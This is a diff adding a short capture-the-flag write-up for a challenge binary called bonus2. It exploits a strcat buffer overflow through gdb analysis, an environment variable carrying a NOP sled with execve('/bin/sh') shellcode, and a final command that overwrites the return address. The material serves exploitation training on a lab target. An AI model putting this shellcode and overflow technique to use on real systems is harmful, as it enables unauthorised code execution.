@@ -1,0 +1,43 @@
+In this one we can see via the source code that thing changes if the lang of the shell is
+nl, fi or else
+
+The program is saying hi to us in different languages, this wont help a lot
+
+(gdb) i functions
+
+0x08048370  strcat
+
+There is a strcat , we will try to exploit it
+
+We see in the source code that the buffer length is 40, so our argv1 will be 40 length.
+
+Then we want to do like in bonus0, but actually way easier
+
+In fact when we give 40 char in the first arg and more than 18 in the second one, it segfaults
+and overwrite eip 
+
+(gdb) r `python -c 'print "a"*40'` 00001111222233334444
+Starting program: /home/user/bonus2/bonus2 `python -c 'print "a"*40'` 00001111222233334444
+Goedemiddag! aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa00001111222233334444
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000 in ?? ()
+
+
+So now we will export the LANG env value with a shell code in it and give our exploit the address of the shellcode in the env variable
+
+export LANG=$(python -c 'print("fi" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+
+gdb bonus2
+
+breakpoint at getenv
+
+x/20s *((char**) environ)
+
+we get 0xbffffebc as our env variable address
+
+lets get in the middle of the NOPs 0xbffffebc + 50 = 0xbffffeee
+
+./bonus2 $(python -c 'print "a" * 40') $(python -c 'print "z" * 18 + "\xe6\xfe\xff\xbf"')
+
+Here we areee !
